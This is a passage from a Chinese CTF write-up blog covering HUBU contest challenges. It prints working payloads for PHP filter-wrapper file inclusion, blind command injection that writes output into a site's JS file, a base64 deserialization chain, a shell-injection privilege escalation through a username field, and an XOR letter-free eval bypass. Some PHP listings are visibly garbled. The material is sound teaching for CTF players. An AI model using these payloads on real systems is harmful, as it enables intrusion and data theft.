src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215117246.png" alt="image-20241130215117246"></p><blockquote><p>嗯，好，满天星，写个脚本挨着读</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">base_url = &quot;http://challenge.hubuctf.cn:30423/flag&quot;</span><br><span class="line">delay = 1  # 延迟1秒</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    url = f&quot;&#123;base_url&#125;&#123;i&#125;.php&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            print(f&quot;Success: &#123;url&#125;&quot;)</span><br><span class="line">            print(response.text)</span><br><span class="line">            print(&quot;-&quot; * 40)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;Failed to access &#123;url&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 延迟1秒</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br><span class="line">print(&quot;All requests completed.&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>最后发现只有两个能打开。</p></blockquote><blockquote><p>先看第一个，在flag42.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215346661.png" alt="image-20241130215346661"></p><blockquote><p>这是个提示信息，提示可能要传参file</p></blockquote><blockquote><p>再看第二个flag79.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215427479.png" alt="image-20241130215427479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (preg_match(&#x27;/base64|http/&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    die(&#x27;base64 | http is not allowed&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;flag in flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>传file，直接filter伪协议读取，然后你就会发现。。。。</p></blockquote><blockquote><p>flag.php是空哒！哈哈哈哈哈！！！！！！</p></blockquote><blockquote><p>我只能说真会玩，第一个网页才是真的后门入口，在第一个网页进行filter读取拿到flag。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9ICJIVUJVQ1RGezUwMGE0MzEyLTM2ZTItNDlkZi05MjRlLTkyY2EzYWM0MDMwN30iIDs/Pgo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUBUCTF&#123;500a4312-36e2-49df-924e-92ca3ac40307&#125;</span><br></pre></td></tr></table></figure><h4 id="RCE-Level-2">RCE - Level 2</h4><blockquote><p>考点：无回显rce</p></blockquote><blockquote><p>根据提示知道是没有回显的。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181550210.png" alt="image-20241207181550210"></p><blockquote><p>打开界面，发现是个登录框，先用御剑扫一下目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181645879.png" alt="image-20241207181645879"></p><blockquote><p>发现cmd.php，打开发现就是命令执行框</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181722098.png" alt="image-20241207181722098"></p><blockquote><p>先随便ping一个</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181915228.png" alt="image-20241207181915228"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181942232.png" alt="image-20241207181942232"></p><blockquote><p>发现几乎没啥过滤，但是就是无回显</p><p>无回显做法：</p><p>\1. 将运行结果写入到网站的文件里。</p><p>\2. 写马</p><p>\3. 进行数据外带，如dnslog，curl等都可以</p></blockquote><blockquote><p>经过测试，发现static/script.js是可以写入的（虽然我也不知道怎么测试的，是看的别人的wp）</p><p>在输入框中输入 127.0.0.1;ls &gt; static/script.js ,页面显示<strong>执行成功</strong></p><p>后查看js文件，可以看到执行的结果</p><p>在根目录下找到flag文件 f1ag_1s_h3r3 （ 127.0.0.1;ls / &gt; static/script.js )</p><p>继续读取flag ，执行 127.0.0.1;cat /f1ag_1s_h3r3 &gt; static/script.js</p></blockquote><h4 id="Web-Pentest">Web Pentest *</h4><blockquote><p>考点：APK分析，反序列化</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183244358.png" alt="image-20241207183244358"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183301370.png" alt="image-20241207183301370"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183315132.png" alt="image-20241207183315132"></p><blockquote><p>根据对话信息可以推测，可能在协会官网的源代码里</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183504391.png" alt="image-20241207183504391"></p><blockquote><p><strong>方式一</strong></p><p>逆向手应该都有安卓模拟器，直接apk安装到模拟器上。或者直接安装到手机上。</p><p>启动app就直接有了web后台地址。</p></blockquote><blockquote><p><strong>方式二</strong></p><p>misc 手应该需要会，apk本质也是个压缩包。把apk后缀改成zip然后解压。直接搜flag 但是有一点要注意，app打包之后xml文件是二进制。因此也考察了选手对于grep的使用情况</p><p>/flag1-21daSD21agfgDDDZVFGSVsasd32Ws2asCZCDw.php</p><p>admin:admin</p><p>grep -a -r “flag” .  # 搜索二进制 递归搜索</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183733181.png" alt="image-20241207183733181"></p><blockquote><p>然后里面就是个简单的反序列化考点</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;FLAG.php&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">public function _ construct($file)</span><br><span class="line">&#123;</span><br><span class="line">$this &gt; file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function test()</span><br><span class="line">&#123;</span><br><span class="line">system($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match(&#x27;/filter/&#x27;, $this &gt; file)) &#123;</span><br><span class="line">echo $this &gt; file;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">其实这个序列化很简单链子是 APT &gt; K1T0 触发魔术方法 toString</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">public function kkk()</span><br><span class="line">&#123;</span><br><span class="line">eval ($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">function _ wakeup()</span><br><span class="line">&#123;</span><br><span class="line">echo $this &gt; eth0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">show_source( _ FILE _ );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = base64_decode($_GET[&#x27;file&#x27;]);</span><br><span class="line">unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;php: / filter/read=convert.base64-</span><br><span class="line">encode/resource=/flag&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match( &quot;filter&quot;,$this &gt; file)) &#123;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">&#125;</span><br><span class="line">$a=new APT();</span><br><span class="line">$a &gt; eth0=new K1T0();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">?</span><br><span class="line">file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqA</span><br><span class="line">GZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29</span><br><span class="line">kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><blockquote><p>读取的时候是读取/flag，而不是flag.php，不然是读取不出来的。</p></blockquote><h2 id="misc">misc</h2><h4 id="真假二维码">真假二维码</h4><blockquote><p>考点：文件分离，压缩包密码爆破</p></blockquote><blockquote><p>下载附件，得到一个压缩包，需要密码，根据提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220123688.png" alt="image-20241130220123688"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220230193.png" alt="image-20241130220230193"></p><blockquote><p>解压，有张二维码，扫一下</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220505297.png" alt="image-20241130220505297"></p><blockquote><p>假的flag，binwalk看一下，发现有包含文件，直接foremost提取，得到另一张二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220723797.png" alt="image-20241130220723797"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220739858.png" alt="image-20241130220739858"></p><blockquote><p>HUBUMARS{751da030-96b5-11ef-89a7-00155d84ef90}</p></blockquote><h4 id="Get-Root-or-Get-Lost">Get Root or Get Lost *</h4><blockquote><p>考点：提权</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173433217.png" alt="image-20241207173433217"></p><blockquote><p>先按照提示连接。</p><p>提权，先试试 sudo -l</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173550048.png" alt="image-20241207173550048"></p><blockquote><p>以sudo命令执行 /opt/game.py ，发现该文件不可读</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173930648.png" alt="image-20241207173930648"></p><blockquote><p>但是在hubumars的家目录下有一个备份文件 game.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174004104.png" alt="image-20241207174004104"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play_game():</span><br><span class="line">    choices = [&quot;石头&quot;, &quot;剪刀&quot;, &quot;布&quot;]</span><br><span class="line">    print(&quot;欢迎来到猜拳游戏！&quot;)</span><br><span class="line">    print(&quot;输入你的选择：&quot;)</span><br><span class="line">    print(&quot;1. 石头&quot;)</span><br><span class="line">    print(&quot;2. 剪刀&quot;)</span><br><span class="line">    print(&quot;3. 布&quot;)</span><br><span class="line">    print(&quot;输入 0 退出游戏&quot;)</span><br><span class="line"></span><br><span class="line">    player = input(&quot;请输入你的名字：&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # global user_choice</span><br><span class="line">            user_choice = int(input(&quot;你的选择：&quot;))</span><br><span class="line">            if user_choice == 0:</span><br><span class="line">                print(&quot;游戏结束！&quot;)</span><br><span class="line">                break</span><br><span class="line">            if user_choice not in [1, 2, 3]:</span><br><span class="line">                print(&quot;无效输入，请选择 1, 2, 3 或 0 退出游戏。&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            user_move = choices[user_choice - 1]</span><br><span class="line">            computer_move = random.choice(choices)</span><br><span class="line"></span><br><span class="line">            print(f&quot;你选择了：&#123;user_move&#125;&quot;)</span><br><span class="line">            print(f&quot;电脑选择了：&#123;computer_move&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            if user_move == computer_move:</span><br><span class="line">                print(&quot;平局！&quot;)</span><br><span class="line">            elif (</span><br><span class="line">                (user_move == &quot;石头&quot; and computer_move == &quot;剪刀&quot;)</span><br><span class="line">                or (user_move == &quot;剪刀&quot; and computer_move == &quot;布&quot;)</span><br><span class="line">                or (user_move == &quot;布&quot; and computer_move == &quot;石头&quot;)</span><br><span class="line">            ):</span><br><span class="line">                print(&quot;你赢了！载入史册&quot;)</span><br><span class="line">                winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;你输了！&quot;)</span><br><span class="line"></span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;无效输入，请输入数字。&quot;)</span><br><span class="line">            user_choice = &quot;无效输入&quot;</span><br><span class="line">            message = &quot;echo 警报警报，检测%s 恶意输入 %s &gt;&gt; warning.txt &quot; % (</span><br><span class="line">                player,</span><br><span class="line">                user_choice,</span><br><span class="line">            )</span><br><span class="line">            print(message)</span><br><span class="line">            with open(&quot;warning.txt&quot;, &quot;a&quot;) as file:</span><br><span class="line">                process = subprocess.Popen(</span><br><span class="line">                    [&quot;echo&quot;, message], stdout=file  # 将标准输出重定向到文件</span><br><span class="line">                )</span><br><span class="line">                process.communicate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    play_game()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>分析看到这段代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br></pre></td></tr></table></figure><blockquote><p>发现会执行winner里面的命令，所以只要将用户名设置成可执行函数，就可以执行。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174332055.png" alt="image-20241207174332055"></p><blockquote><p>如上图，whoami被执行了，所以我们这次执行找flag.php的命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;find / -name &quot;*flag*&quot; 2&gt;/dev/null;</span><br></pre></td></tr></table></figure><blockquote><p>然后读取root目录下的flag即可</p></blockquote><h4 id="隐秘的流量">隐秘的流量</h4><blockquote><p>考点：流量分析，ICMP协议</p></blockquote><blockquote><p>用wireshake打开，统计-&gt; 分级协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175808812.png" alt="image-20241207175808812"></p><blockquote><p>发现有UDP,TCP,ICMP协议</p><p>重点关注ICMP协议。</p><p>WireShark 过滤条件 icmp &amp; icmp.type = 8 【含义：icmp协议，类型8代</p><p>表发送请求，参考：ICMP报文的格式和种类-腾讯云开发者社区-腾讯云)</p><p>注意到后面都有几个特殊的字符，提取出来</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175917648.png" alt="image-20241207175917648"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 使用tshark 提取</span><br><span class="line">└─🍀 tshark -r secret.pcapng -Y &#x27;icmp &amp;&amp; icmp.type = 8&#x27; -T fields -e &quot;data.data&quot; | xxd -p -r | base32 -d | base64 -d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">-r : 读取文件，后面跟流量包文件名</span><br><span class="line">-Y : 过滤的条件，这里是icmp的方法请求的流量包</span><br><span class="line">-T :设置输出格式，如json，fields等</span><br><span class="line">-e : 输出特定的字段</span><br><span class="line">xxd -p -r ：将十六进制转化为字符串</span><br><span class="line"></span><br><span class="line">windows如果安装了wireshake，则在其目录下有个tshark.exe程序。</span><br></pre></td></tr></table></figure><blockquote><p>HUBUMARS{1CMp_da7a_15_1n73R3571N9}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBU新星杯wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>HUBUCTF-2022-新生赛-wp</title>
    <link href="https://blog.m3x1.cn/posts/1f67230d.html"/>
    <id>https://blog.m3x1.cn/posts/1f67230d.html</id>
    <published>2024-11-28T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:35.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" alt="image-20241129191723974"></p><blockquote><p>NSSCTF{29cf034a-9052-4aec-b776-b1c8b18b82f5}</p></blockquote><h2 id="HowToGetShell">HowToGetShell</h2><blockquote><p>考点：无字母rce，php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure><p>过滤了所有字母，但有字母，可以使用异或绕过。脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot; #可以用的符号</span><br><span class="line">answer = &quot;phpinfo&quot;  #要构造的命令</span><br><span class="line">tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if (ord(i)^ord(j) == ord(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">print(tmp1,tmp2)</span><br><span class="line">//0302181 @[@[_^^ ，所以传入&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129203748374.png" alt="image-20241129203748374"></p><blockquote><p>NSSCTF{3290ae33-f255-4d6b-9bba-2b1be6ddd485}</p></blockquote><h2 id="Calculate">Calculate</h2><blockquote><p>考点：python,web,脚本编写</p></blockquote><p>直接上脚本吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 假设这是我们要与之交互的网站的URL</span><br><span class="line">url = &#x27;http://node5.anna.nssctf.cn:28984/&#x27;  # 请替换为实际的URL</span><br><span class="line"></span><br><span class="line"># 创建一个会话来保持cookie和其他会话信息</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"># 正则表达式模式来匹配数字或运算符，它们被&lt;div&gt;标签包围</span><br><span class="line">pattern = re.compile(r&#x27;&lt;div[^&gt;]*?&gt;([0-9+\-*\/=]+)&lt;/div&gt;&#x27;)</span><br><span class="line"></span><br><span class="line"># 循环直到我们找到包含关键词&quot;ctf&quot;的页面</span><br><span class="line">for i in range(20):</span><br><span class="line">    # 发送GET请求来获取当前页面</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    html_content = response.text</span><br><span class="line">    </span><br><span class="line">    # 使用BeautifulSoup解析HTML内容</span><br><span class="line">    soup = BeautifulSoup(html_content, &#x27;html.parser&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 查找所有包含数字或运算符的&lt;div&gt;标签</span><br><span class="line">    divs = soup.find_all(&#x27;div&#x27;, text=re.compile(r&#x27;[0-9+\-*\/=]&#x27;))</span><br><span class="line">    </span><br><span class="line">    # 使用正则表达式从标签中提取数字或运算符</span><br><span class="line">    tokens = pattern.findall(str(divs))</span><br><span class="line">    </span><br><span class="line">    # 